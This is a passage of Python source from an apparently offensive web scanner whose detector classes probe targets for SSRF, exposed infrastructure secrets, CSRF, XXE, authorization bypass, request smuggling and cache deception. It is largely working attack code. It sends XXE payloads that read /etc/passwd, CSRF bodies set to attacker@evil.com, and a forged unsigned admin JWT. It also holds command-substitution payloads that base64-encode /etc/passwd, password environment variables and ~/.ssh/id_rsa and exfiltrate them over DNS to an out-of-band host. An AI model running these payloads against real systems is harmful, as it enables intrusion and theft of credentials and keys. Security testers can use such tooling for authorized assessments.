                                poc_curl=f"curl -sk '{url}' | grep -oE '{pattern[:40]}'",
                                category="Secrets / Hardcoded Keys",
                                remediation=f"Revoke {key_type} immediately. Move secrets to server-side environment variables. Use backend proxy for all {key_type} calls. Implement secret scanning in CI/CD (git-secrets, TruffleHog, Gitleaks)."
                            ))
            except Exception:
                pass
        return profile


class WebSocketSSRFDetector:
    """Detect WebSocket connection upgrade used to pivot to internal SSRF."""
    NAME = "WebSocket SSRF Detector"
    WS_ENDPOINTS = [
        "/ws", "/websocket", "/socket", "/socket.io/", "/ws/",
        "/api/ws", "/api/websocket", "/stream", "/events",
        "/live", "/realtime", "/notify", "/push",
        "/stomp", "/mqtt", "/amqp-ws",
    ]
    WS_PAYLOADS = [
        '{"type":"connect","url":"http://169.254.169.254/latest/meta-data/"}',
        '{"action":"fetch","target":"http://169.254.169.254/"}',
        '{"cmd":"proxy","url":"http://internal.service/"}',
        '{"subscribe":"http://metadata.google.internal/computeMetadata/v1/"}',
        '{"type":"request","method":"GET","url":"http://localhost:8080/admin"}',
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.WS_ENDPOINTS:
            url = base + path
            try:
                # Probe for WS upgrade acceptance
                r = _fetch(url, cfg.ua, cfg.timeout, extra_headers={
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Sec-WebSocket-Version": "13",
                    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                })
                if r and r.status in (101, 200, 400, 426):
                    hdrs = str(r.headers)
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in hdrs.lower() for sig in [
                        "upgrade: websocket", "101 switching", "websocket",
                        "sec-websocket-accept", "socket.io"
                    ]) or r.status in (101, 426):
                        profile.findings.append(Finding(
                            id=f"WSSSRF-{path.replace('/','_').strip('_')[:16].upper()}",
                            title=f"WebSocket SSRF Attack Surface: {path}",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-918",
                            description=(
                                f"WebSocket endpoint {path} accepts upgrade requests. "
                                "If WebSocket messages are forwarded to internal URLs or "
                                "processed as proxy commands, enables SSRF to internal services, "
                                "cloud IMDS, and private network scanning."
                            ),
                            evidence=f"HTTP {r.status} | Headers: {hdrs[:200]}",
                            poc_curl=(
                                f"# Test WebSocket SSRF via wscat:\n"
                                f"wscat -c 'ws://{profile.host}{path}' "
                                f"--execute '{self.WS_PAYLOADS[0]}'\n"
                                f"# Or via curl upgrade:\n"
                                f"curl -sk -i -N -H 'Upgrade: websocket' "
                                f"-H 'Connection: Upgrade' "
                                f"-H 'Sec-WebSocket-Version: 13' "
                                f"-H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' '{url}'"
                            ),
                            category="WebSocket / SSRF",
                            remediation="Validate all WebSocket messages. Never forward WebSocket data to internal URLs. Implement URL allowlist for any proxy functionality. Apply authentication before WebSocket upgrade."
                        ))
            except Exception:
                pass
        return profile


class HelmChartSecretDetector:
    """Detect Helm chart values, Kubernetes secrets, and CI/CD credential exposure."""
    NAME = "Helm Chart Secret Detector"
    HELM_PATHS = [
        "/helm/values.yaml", "/charts/values.yaml", "/k8s/values.yaml",
        "/deploy/values.yaml", "/values.yaml", "/k8s/secrets.yaml",
        "/kubernetes/secrets.yaml", "/manifests/secrets.yaml",
        "/k8s/configmap.yaml", "/deploy/configmap.yaml",
        "/docker-compose.yml", "/docker-compose.yaml",
        "/docker-compose.prod.yml", "/docker-compose.production.yml",
        "/terraform.tfvars", "/terraform.tfstate",
        "/ansible/group_vars/all.yml", "/playbook.yml",
        "/.kube/config", "/kubeconfig",
    ]
    SECRET_KEYS = [
        "password:", "secret:", "token:", "apiKey:", "api_key:",
        "db_password:", "database_password:", "jwt_secret:",
        "private_key:", "client_secret:", "service_account:",
        "AWS_SECRET", "STRIPE_SECRET", "SENDGRID", "TWILIO",
        "connectionString:", "mongodbUri:", "postgresUri:",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.HELM_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    hits = [k for k in self.SECRET_KEYS if k.lower() in body.lower()]
                    if hits or "apiVersion:" in body or "kind:" in body:
                        profile.findings.append(Finding(
                            id=f"HELM-SECRET-{path.replace('/','_').strip('_')[:16].upper()}",
                            title=f"Infrastructure Credential/Config Exposed: {path}",
                            severity="CRITICAL" if hits else "HIGH",
                            cvss=9.8 if hits else 7.5,
                            cwe="CWE-538",
                            description=(
                                f"Infrastructure configuration file {path} accessible. "
                                + (f"Secret keys detected: {', '.join(hits[:5])}. "
                                   if hits else
                                   "Kubernetes/Helm configuration exposed. ")
                                + "Exposes database credentials, API keys, cloud service accounts, "
                                "and deployment infrastructure details."
                            ),
                            evidence=body[:400],
                            poc_curl=f"curl -sk '{url}'",
                            category="Infrastructure Secrets",
                            remediation="Remove all infrastructure configs from web root. Use sealed-secrets or external-secrets operator for K8s secrets. Encrypt Helm values. Never commit plaintext secrets to repos."
                        ))
            except Exception:
                pass
        return profile


class InternalAPIGatewayDetector:
    """Detect internal API gateway routes, admin APIs, and inter-service communication leaks."""
    NAME = "Internal API Gateway Detector"
    GATEWAY_PATHS = [
        "/internal/", "/internal/api/", "/api/internal/",
        "/_internal/", "/private/", "/api/private/",
        "/admin/api/", "/api/admin/", "/management/",
        "/actuator/gateway/routes", "/actuator/gateway/globalfilters",
        "/gateway/routes", "/routes",
        "/api/gateway/", "/proxy/", "/api/proxy/",
        "/service/", "/services/", "/microservice/",
        "/api/health/all", "/api/status/all",
        "/api/v1/system/", "/system/info",
        "/api/debug/routes", "/debug/routes",
        "/swagger-ui/index.html", "/swagger-ui.html",
        "/api-docs", "/v2/api-docs", "/v3/api-docs",
        "/openapi.json", "/openapi.yaml",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.GATEWAY_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 201):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        '"routes"', '"route"', '"filters"', '"predicates"',
                        '"services"', '"microservices"', '"endpoints"',
                        '"swagger"', '"openapi"', '"paths":', '"info":',
                        '"servers":', '"tags":', '"components":',
                        "swagger", "OpenAPI", "Swagger UI",
                        "http://", "grpc://", "ws://",
                        '"uri":', '"lb://', '"http://',
                    ]):
                        is_critical = any(s in body for s in [
                            '"lb://', 'internal', 'private', 'admin'
                        ])
                        profile.findings.append(Finding(
                            id=f"GATEWAY-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"API Gateway/Internal Routes Exposed: {path}",
                            severity="CRITICAL" if is_critical else "HIGH",
                            cvss=9.1 if is_critical else 7.5,
                            cwe="CWE-284",
                            description=(
                                f"API gateway route configuration or internal API at {path}. "
                                "Exposes: internal service addresses (lb://service-name), "
                                "private endpoint URLs, microservice architecture, "
                                "authentication bypass routes, and undocumented admin APIs."
                            ),
                            evidence=body[:400],
                            poc_curl=f"curl -sk '{url}' | python3 -m json.tool",
                            category="API Gateway",
                            remediation="Restrict all internal/admin routes to internal network. Apply authentication on gateway management API. Use separate port for management (never expose publicly). Audit all route configurations."
                        ))
            except Exception:
                pass
        return profile


class CSRFAdvancedDetector:
    """Detect advanced CSRF: SameSite bypass, token fixation, JSON CSRF, and Flash-based CSRF."""
    NAME = "CSRF Advanced Detector"
    CSRF_PATHS = [
        "/api/user/update", "/api/password/change", "/api/email/change",
        "/api/account/settings", "/api/profile/update",
        "/api/admin/create", "/api/user/delete",
        "/api/transfer", "/api/payment",
        "/settings", "/account", "/profile",
        "/api/v1/user", "/api/v2/user",
    ]
    CSRF_PAYLOADS = [
        # JSON CSRF via text/plain
        ("text/plain", '{"email":"attacker@evil.com","__proto__":null}'),
        # application/x-www-form-urlencoded
        ("application/x-www-form-urlencoded", "email=attacker%40evil.com&role=admin"),
        # multipart/form-data CSRF
        ("multipart/form-data; boundary=xxxx", "--xxxx\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nattacker@evil.com\r\n--xxxx--"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.CSRF_PATHS[:8]:
            url = base + path
            for ctype, body_data in self.CSRF_PAYLOADS:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                               body_data.encode(),
                               {"Content-Type": ctype,
                                "Origin": "https://evil.com",
                                "Referer": "https://evil.com/csrf.html"})
                    if r and r.status in (200, 201):
                        body_resp = (r.body or b"").decode("utf-8", errors="replace")
                        acao = r.headers.get("access-control-allow-origin", "")
                        if any(sig in body_resp for sig in [
                            '"success"', '"updated"', '"changed"', '"ok"',
                            '"user"', '"profile"', '"account"',
                            "success", "updated", "changed"
                        ]):
                            samesite = "SameSite" not in str(profile.findings)
                            profile.findings.append(Finding(
                                id=f"CSRF-ADV-{ctype[:12].replace('/','-').replace(';','').upper()}-{path.replace('/','_')[:12].upper()}",
                                title=f"Advanced CSRF — {ctype.split(';')[0]} accepted at {path}",
                                severity="HIGH",
                                cvss=8.1,
                                cwe="CWE-352",
                                description=(
                                    f"CSRF via {ctype} Content-Type at {path} returned success "
                                    f"despite cross-origin request from evil.com. "
                                    "No CSRF token validation detected for this Content-Type variant."
                                ),
                                evidence=f"Content-Type: {ctype} | HTTP {r.status} | ACAO: {acao} | Response: {body_resp[:150]}",
                                poc_curl=(
                                    f"curl -sk -X POST '{url}' "
                                    f"-H 'Content-Type: {ctype}' "
                                    f"-H 'Origin: https://evil.com' "
                                    f"-d '{body_data[:80]}'"
                                ),
                                category="CSRF",
                                remediation="Implement CSRF tokens for all state-changing operations. Validate Content-Type allowlist. Set SameSite=Strict on session cookies. Verify Origin/Referer headers server-side."
                            ))
                            break
                except Exception:
                    pass
        return profile


class XXEOOBAdvanced:
    """Detect advanced OOB XXE via SVG upload, XLIFF, Office documents, and RSS feeds."""
    NAME = "XXE OOB Advanced"
    OOB = "YOUR_OOB_DOMAIN.burpcollaborator.net"
    XXE_PAYLOADS = {
        "svg": ('<?xml version="1.0"?><!DOCTYPE svg ['
                '<!ENTITY xxe SYSTEM "http://xxe.{host}.{oob}/">'
                ']><svg xmlns="http://www.w3.org/2000/svg">'
                '<text>&xxe;</text></svg>'),
        "xml": ('<?xml version="1.0"?><!DOCTYPE root ['
                '<!ENTITY % xxe SYSTEM "http://param.{host}.{oob}/">'
                '%xxe;]><root></root>'),
        "xliff": ('<?xml version="1.0"?><!DOCTYPE xliff ['
                  '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
                  ']><xliff version="1.2"><file><body>'
                  '<trans-unit><source>&xxe;</source></trans-unit>'
                  '</body></file></xliff>'),
        "rss": ('<?xml version="1.0"?><!DOCTYPE rss ['
                '<!ENTITY xxe SYSTEM "http://rss.{host}.{oob}/">'
                ']><rss><channel><title>&xxe;</title></channel></rss>'),
    }
    UPLOAD_PATHS = [
        "/api/upload", "/api/import", "/api/parse",
        "/api/convert", "/upload", "/import",
        "/api/svg", "/api/xml", "/api/rss",
        "/api/feed", "/api/v1/import", "/api/v2/upload",
        "/api/xliff", "/translate",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        host = profile.host
        oob = self.OOB
        for path in self.UPLOAD_PATHS[:8]:
            url = base + path
            for fmt, tmpl in self.XXE_PAYLOADS.items():
                payload = tmpl.format(host=host, oob=oob)
                ctypes = {
                    "svg": "image/svg+xml",
                    "xml": "application/xml",
                    "xliff": "application/x-xliff+xml",
                    "rss": "application/rss+xml",
                }
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                               payload.encode(),
                               {"Content-Type": ctypes[fmt]})
                    if r and r.status in (200, 201, 400, 422):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if any(sig in body for sig in [
                            "root:", "bin/bash", "etc/passwd",
                            payload[:20], "xml", "entity",
                        ]):
                            profile.findings.append(Finding(
                                id=f"XXE-OOB-ADV-{fmt.upper()}-{path.replace('/','_')[:12].upper()}",
                                title=f"Advanced XXE via {fmt.upper()} at {path}",
                                severity="CRITICAL",
                                cvss=9.1,
                                cwe="CWE-611",
                                description=(
                                    f"XXE injection via {fmt.upper()} Content-Type at {path}. "
                                    "OOB payload generated for Burp Collaborator/interactsh. "
                                    "Enables: /etc/passwd read, SSRF to internal services, "
                                    "cloud IMDS access, and blind data exfiltration."
                                ),
                                evidence=f"HTTP {r.status} | Response: {body[:200]}",
                                poc_curl=(
                                    f"curl -sk -X POST '{url}' "
                                    f"-H 'Content-Type: {ctypes[fmt]}' "
                                    f"-d '{payload[:80]}...'"
                                ),
                                category="XXE",
                                remediation=f"Disable DOCTYPE/external entity processing in {fmt.upper()} parser. Use defusedxml/lxml with resolve_entities=False. Apply input validation on all uploaded {fmt} files."
                            ))
                            break
                except Exception:
                    pass
        return profile


class BrokenFunctionLevelAuth:
    """Detect Broken Function Level Authorization — admin functions accessible to regular users."""
    NAME = "Broken Function Level Auth"
    ADMIN_PATHS = [
        # Admin endpoints to probe without auth
        ("/api/admin/users",        "GET",  "Admin user list"),
        ("/api/admin/settings",     "GET",  "Admin settings"),
        ("/api/admin/logs",         "GET",  "Admin audit logs"),
        ("/api/v1/admin",           "GET",  "Admin API root"),
        ("/api/admin/export",       "GET",  "Data export"),
        ("/api/admin/tokens",       "GET",  "API tokens"),
        ("/api/admin/invoices",     "GET",  "Financial records"),
        ("/api/admin/delete-user",  "POST", "Delete user"),
        ("/api/admin/create-admin", "POST", "Create admin"),
        ("/api/internal/users",     "GET",  "Internal user API"),
        ("/api/internal/config",    "GET",  "Internal config"),
        ("/v2/admin/",              "GET",  "Admin v2 API"),
        ("/api/superuser/",         "GET",  "Superuser endpoint"),
        ("/api/root/",              "GET",  "Root endpoint"),
        ("/api/system/",            "GET",  "System API"),
        ("/admin/api/v1/",          "GET",  "Admin API v1"),
    ]
    PRIVILEGE_TOKENS = [
        {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ."},
        {"Authorization": "Bearer null"},
        {"Authorization": "Bearer undefined"},
        {"X-Role": "admin"},
        {"X-User-Role": "administrator"},
        {"X-Admin": "1"},
        {"X-Internal": "true"},
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path, method, desc in self.ADMIN_PATHS:
            url = base + path
            # Test without auth
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, method)
                if r and r.status in (200, 201):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        '"users"', '"admin"', '"settings"', '"logs"',
                        '"config"', '"tokens"', '"email"', '"role"',
                        '"id":', '"items"', '"data"', "admin", "true",
                    ]):
                        profile.findings.append(Finding(
                            id=f"BFLA-NAUTH-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"BFLA — Admin Function Unauthenticated: {desc} at {path}",
                            severity="CRITICAL",
                            cvss=9.8,
                            cwe="CWE-285",
                            description=(
                                f"Admin function '{desc}' at {path} accessible without authentication. "
                                "Broken Function Level Authorization — user can perform privileged operations "
                                "without possessing the required role or any authentication."
                            ),
                            evidence=body[:300],
                            poc_curl=f"curl -sk -X {method} '{url}'",
                            category="BFLA / Auth",
                            remediation="Implement role-based access control (RBAC) at function level. Verify user permissions on every request. Use middleware-based authorization. Never rely on URL obscurity."
                        ))
                        continue
            except Exception:
                pass
            # Test with privilege-escalation headers
            for headers in self.PRIVILEGE_TOKENS[:3]:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, method,
                               extra_headers=headers)
                    if r and r.status in (200, 201):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if any(sig in body for sig in [
                            '"users"', '"admin"', '"email"', '"role"',
                            '"id":', '"items"', "admin", "true",
                        ]):
                            hdr_str = ", ".join(f"{k}: {v}" for k, v in headers.items())
                            profile.findings.append(Finding(
                                id=f"BFLA-HDRBYPASS-{path.replace('/','_').strip('_')[:16].upper()}",
                                title=f"BFLA — Admin Access via Header Bypass: {path}",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-285",
                                description=(
                                    f"Admin endpoint {path} granted access via header bypass: {hdr_str}. "
                                    "Header-based role injection bypasses authentication — "
                                    "attacker can impersonate any role."
                                ),
                                evidence=body[:200],
                                poc_curl=(
                                    f"curl -sk -X {method} '{url}' "
                                    + " ".join(f"-H '{k}: {v}'" for k, v in headers.items())
                                ),
                                category="BFLA / Auth",
                                remediation="Never trust role/admin headers from client. Implement server-side session-based authorization. Remove X-Role, X-Admin, X-Internal header processing."
                            ))
                            break
                except Exception:
                    pass
        return profile


class DNSExfilDetector:
    """Detect DNS exfiltration channel width and OOB payload capacity analysis."""
    NAME = "DNS Exfil Detector"
    OOB = "YOUR_OOB_DOMAIN.burpcollaborator.net"
    EXFIL_PAYLOADS = [
        # DNS label max = 63 chars, total FQDN = 253 chars
        "$(cat /etc/passwd | base64 | tr -d '\\n' | cut -c1-50)",
        "$(id | base64)",
        "$(hostname | base64)",
        "$(whoami | base64)",
        "$(env | grep -i pass | base64 | head -c 50)",
        "$(cat ~/.ssh/id_rsa | base64 | cut -c1-50)",
    ]
    INJECT_PARAMS = [
        "name", "host", "server", "target", "dest", "destination",
        "fqdn", "hostname", "domain", "address", "ip", "lookup",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        host = profile.host
        oob = self.OOB
        # Generate channel capacity analysis
        max_per_query = 63 * 3  # three labels × 63 chars
        exfil_payloads_generated = []
        for payload in self.EXFIL_PAYLOADS:
            dns_payload = (
                f"$({payload}).exfil.{host}.{oob}"
            )
            exfil_payloads_generated.append(dns_payload)
        # Also test via SSRF parameters
        for param in self.INJECT_PARAMS[:4]:
            for exfil_cmd in self.EXFIL_PAYLOADS[:2]:
                url = f"{base}/?{param}={urllib.parse.quote(exfil_cmd + '.' + oob)}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status in (200, 500):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if any(sig in body for sig in [
                            "dns", "lookup", "resolve", "hostname", "NXDOMAIN",
                        ]):
                            profile.findings.append(Finding(
                                id=f"DNS-EXFIL-{param.upper()[:10]}",
                                title=f"DNS Exfiltration Channel Surface via ?{param}",
                                severity="HIGH",
                                cvss=7.5,
                                cwe="CWE-200",
                                description=(
                                    f"Parameter ?{param} triggers DNS resolution. "
                                    "Enables covert DNS exfiltration: encode sensitive data in subdomains, "
                                    f"max capacity ~{max_per_query} chars per query. "
                                    "Bypasses HTTP egress filtering."
                                ),
                                evidence=body[:200],
                                poc_curl=f"curl -sk '{url}'",
                                category="DNS Exfiltration",
                                remediation="Apply DNS query filtering. Block DNS queries to unknown/dynamic domains. Implement egress filtering at network level. Monitor DNS query logs for anomalous patterns."
                            ))
                except Exception:
                    pass
        profile.findings.append(Finding(
            id="DNS-EXFIL-CAPACITY-001",
            title="DNS Exfiltration — Channel Analysis & Payload Library",
            severity="INFO",
            cvss=0.0,
            cwe="CWE-200",
            description=(
                f"DNS exfiltration channel capacity: ~{max_per_query} chars/query via 3-label subdomain. "
                f"Generated {len(exfil_payloads_generated)} OOB DNS exfil payloads. "
                "Use interactsh with DNS listener to capture exfiltrated data."
            ),
            evidence="\n".join(f"  [{i+1}] {p[:80]}" for i, p in enumerate(exfil_payloads_generated)),
            poc_curl=(
                f"# DNS exfil via curl:\n"
                f"curl -sk '{base}/?host=$(id|base64).{host}.{oob}'\n"
                f"# Listen with interactsh:\n"
                f"interactsh-client -server interactsh.com -n 1"
            ),
            category="DNS Exfiltration",
            remediation="Monitor DNS queries for anomalous subdomain patterns. Implement Response Policy Zones (RPZ). Apply DNS-over-HTTPS with filtering. Block outbound UDP 53 from application servers."
        ))
        return profile


class ServerlessExposureDetector:
    """Detect exposed serverless functions (Lambda, Azure Functions, Cloud Run) and misconfigs."""
    NAME = "Serverless Exposure Detector"
    SERVERLESS_PATHS = [
        # AWS Lambda via API Gateway
        "/.netlify/functions/", "/netlify/functions/",
        "/api/lambda/", "/.functions/",
        # Azure Functions
        "/api/HttpTrigger", "/api/HttpTrigger1",
        "/api/Function1", "/api/function/",
        "/admin/functions/", "/admin/host/",
        "/runtime/webhooks/", "/runtime/webhooks/durabletask/",
        # Cloud Run / GCF
        "/__functions/", "/function-source.zip",
        "/.well-known/cloud-run",
        # Vercel
        "/api/", "/_next/data/",
        # Generic serverless
        "/functions/", "/lambda/", "/worker/",
        "/api/worker/", "/edge/",
    ]
    FUNCTION_KEYS = [
        "x-functions-key", "x-ms-client-principal",
        "x-function-client-id", "x-functions-clientid",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.SERVERLESS_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 401, 403, 400):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    hdrs = str(r.headers)
                    if any(sig in body + hdrs for sig in [
                        "functions", "lambda", "serverless",
                        "AzureWebJobsStorage", "x-functions",
                        "azure-functions", "netlify", "vercel",
                        "cloud-run", "worker", "x-ms-request-id",
                        "FUNCTION_", "AWS_LAMBDA", "LAMBDA_",
                        "functionKey", "application_settings",
                    ]):
                        sev = "HIGH" if r.status == 200 else "MEDIUM"
                        profile.findings.append(Finding(
                            id=f"SERVERLESS-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Serverless Function Endpoint Exposed: {path}",
                            severity=sev,
                            cvss=7.5 if sev == "HIGH" else 5.3,
                            cwe="CWE-284",
                            description=(
                                f"Serverless function endpoint at {path} (HTTP {r.status}). "
                                "Exposed serverless endpoints may: accept unauthenticated requests, "
                                "leak environment variables (DB credentials, API keys), "
                                "allow SSRF to VPC-internal resources, or execute arbitrary code "
                                "via injection in function parameters."
                            ),
                            evidence=body[:200],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# Test without function key:\n"
                                f"curl -sk '{url}?name=test'\n"
                                f"# Probe env vars via SSTI if supported:\n"
                                f"curl -sk '{url}?name=${{env.AWS_SECRET_ACCESS_KEY}}'"
                            ),
                            category="Serverless / FaaS",
                            remediation="Require function-level authentication keys. Apply CORS restrictions. Use VPC egress filtering. Never log/return environment variables. Apply least-privilege IAM for function execution roles."
                        ))
            except Exception:
                pass
        return profile

# ══════════════════════════════════════════════════════════════
# TOOLS 271-340 — 70 Red/Black Team Skills (Phase 14)
# ══════════════════════════════════════════════════════════════

class HTTPRequestSmugglingFrontend:
    """Detect HTTP request smuggling at CDN/load-balancer level (CL.0, TE.0, H2.TE, H2.CL)."""
    NAME = "HTTP Request Smuggling Frontend"
    SMUGGLE_PROBES = [
        # CL.0 — server ignores Content-Length
        ("CL.0", "POST", {
            "Transfer-Encoding": "chunked",
            "Content-Length": "6",
        }, b"0\r\n\r\nG"),
        # TE.0 — server ignores Transfer-Encoding
        ("TE.0", "POST", {
            "Transfer-Encoding": "xchunked",
            "Content-Length": "4",
        }, b"1\r\nZ\r\n0\r\n\r\n"),
        # H2.TE downgrade
        ("H2.TE", "POST", {
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/x-www-form-urlencoded",
        }, b"0\r\n\r\n"),
        # Obfuscated TE
        ("TE-OBF", "POST", {
            "Transfer-Encoding": "\tchunked",
            "Content-Length": "4",
        }, b"1\r\nA\r\n0\r\n\r\n"),
        # Duplicate CL
        ("CL-DUPE", "POST", {
            "Content-Length": "13",
            "Content-Length ": "0",
        }, b"SMUGGLED-DATA"),
    ]
    SMUGGLE_PATHS = ["/", "/api/", "/search", "/login", "/upload"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.SMUGGLE_PATHS[:3]:
            url = base + path
            for variant, method, extra_hdrs, body in self.SMUGGLE_PROBES:
                try:
                    t0 = time.time()
                    r = _fetch(url, cfg.ua, cfg.timeout, method, body,
                               extra_headers=extra_hdrs)
                    elapsed = time.time() - t0
                    if r and r.status in (200, 400, 408, 505):
                        indicator = (
                            elapsed > cfg.timeout * 0.7 or
                            r.status == 408 or
                            b"SMUGGLED" in (r.body or b"")
                        )
                        if indicator:
                            profile.findings.append(Finding(
                                id=f"SMUGGLE-FE-{variant}-{path.replace('/','_').strip('_')[:10].upper()}",
                                title=f"HTTP Request Smuggling ({variant}) at {path}",
                                severity="CRITICAL",
                                cvss=9.0,
                                cwe="CWE-444",
                                description=(
                                    f"HTTP smuggling variant {variant} produced anomalous response "
                                    f"(HTTP {r.status}, {elapsed:.1f}s) at {path}. "
                                    "Enables cache poisoning, WAF bypass, credential theft, "
                                    "and cross-user request hijacking."
                                ),
                                evidence=f"Variant: {variant} | HTTP {r.status} | Time: {elapsed:.2f}s",
                                poc_curl=(
                                    "# " + variant + " smuggling probe:\n"
                                    "printf 'POST " + path + " HTTP/1.1\\r\\n"
                                    "Host: " + profile.host + "\\r\\n"
                                    + "".join(k + ": " + v + "\\r\\n" for k, v in extra_hdrs.items())
                                    + "\\r\\n"
                                    + body.decode(errors="replace")
                                    + "' | nc " + profile.host + " 443"
                                ),
                                category="HTTP Smuggling",
                                remediation="Normalize HTTP headers at CDN/LB layer. Enforce strict Content-Length/TE validation. Reject ambiguous requests. Use HTTP/2 end-to-end where possible."
                            ))
                            break
                except Exception:
                    pass
        return profile


class CacheDeceptionAdvanced:
    """Detect advanced web cache deception: CDN cache poisoning, path confusion, DoS."""
    NAME = "Cache Deception Advanced"
    CACHE_PATHS = [
        "/profile.css", "/account.js", "/dashboard.png",
        "/api/user/profile.css", "/api/account/settings.js",
        "/api/me.jpg", "/me/data.css", "/user/info.png",
        "/api/admin.css", "/api/secret.js",
        "/logout/x.css", "/reset/x.js",
    ]
    CACHE_HEADERS_PROBE = [
        {"Cache-Control": "max-age=31536000"},
        {"X-Forwarded-Host": "evil.com"},
        {"X-Host": "evil.com"},
        {"X-Forwarded-Scheme": "http"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.CACHE_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    hdrs = str(r.headers).lower()
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    cached = any(s in hdrs for s in [
                        "age:", "x-cache: hit", "cf-cache-status: hit",
                        "x-varnish:", "via:", "x-cache-hits:",
                        "cache-control: max-age", "cache-control: public",
                    ])
                    has_sensitive = any(s in body for s in [
                        "email", "token", "session", "user", "auth",
                        "account", "profile", "password", "secret",
                    ])
                    if cached or has_sensitive:
                        profile.findings.append(Finding(
                            id=f"CACHE-DECEP-ADV-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Web Cache Deception — {path}",
                            severity="HIGH" if has_sensitive else "MEDIUM",
                            cvss=7.5 if has_sensitive else 5.3,
                            cwe="CWE-525",
                            description=(
                                f"Static-extension URL {path} returned HTTP 200"
                                + (" with sensitive data" if has_sensitive else "")
                                + (" and cache headers" if cached else "")
                                + ". Forces CDN to cache authenticated user data — "
                                "attacker requests cached URL to steal victim's response."
                            ),
                            evidence=f"Cached: {cached} | Sensitive: {has_sensitive} | Snippet: {body[:150]}",
                            poc_curl=(
                                f"# Step 1 — Victim visits:\n"
                                f"curl -sk '{url}' -H 'Cookie: session=VICTIM_SESSION'\n"
                                f"# Step 2 — Attacker reads cached response:\n"
                                f"curl -sk '{url}'"
                            ),
                            category="Cache Deception",
                            remediation="Strip static-file extensions from authenticated API routes. Set Cache-Control: no-store on all authenticated responses. Configure CDN to never cache URLs with auth cookies."
                        ))
            except Exception:
                pass
        # Cache poisoning via unkeyed headers
        for poison_hdr in self.CACHE_HEADERS_PROBE:
            url = base + "/"
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, extra_headers=poison_hdr)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    hdr_val = list(poison_hdr.values())[0]
                    if hdr_val in body:
                        hdr_name = list(poison_hdr.keys())[0]
                        profile.findings.append(Finding(
                            id=f"CACHE-POISON-HDR-{hdr_name.replace('-','_').upper()[:16]}",
                            title=f"Cache Poisoning via Unkeyed Header: {hdr_name}",
                            severity="HIGH",
                            cvss=8.1,
                            cwe="CWE-346",
                            description=(
                                f"Header {hdr_name}: {hdr_val} reflected in response body — "
                                "indicates header is unkeyed by CDN cache. "
                                "Attacker can poison cache with malicious content delivered to all users."
                            ),
                            evidence=f"Header: {hdr_name}: {hdr_val} | Reflected: True",
                            poc_curl=(
                                f"curl -sk '{url}' -H '{hdr_name}: {hdr_val}'"
                            ),
                            category="Cache Poisoning",
                            remediation="Add all input headers to cache key. Validate and sanitise X-Forwarded-Host. Block X-Original-URL and X-Rewrite-URL at load balancer."
                        ))
            except Exception:
                pass
        return profile


class APIGatewayBypass:
    """Detect API gateway authentication bypass via path confusion and header injection."""
    NAME = "API Gateway Bypass"
    BYPASS_PATHS = [
        # Path normalisation bypasses
        ("/api/admin",     "/api/admin/"),
        ("/api/admin",     "/api/admin/."),
        ("/api/admin",     "/api/admin%2f"),
        ("/api/admin",     "/api/admin%2F"),
        ("/api/admin",     "/api/admin%2e"),
